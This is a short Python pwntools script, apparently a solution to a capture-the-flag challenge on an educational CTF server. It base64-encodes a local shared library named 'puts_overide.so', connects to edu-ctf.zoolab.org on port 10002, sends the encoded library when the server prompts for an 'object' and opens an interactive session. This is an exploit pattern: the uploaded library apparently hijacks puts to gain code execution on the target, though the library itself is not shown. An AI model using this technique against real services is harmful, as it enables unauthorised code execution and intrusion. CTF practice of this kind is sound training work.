from pwn import *
import base64
import binascii


with open('./puts_overide.so', 'rb') as f:
    content = f.read()

# print(content)
b64_content = base64.b64encode(content)

r = remote('edu-ctf.zoolab.org', 10002)
r.recvuntil('object:'.encode())
# r.interactive()
r.sendline(b64_content)
r.interactive()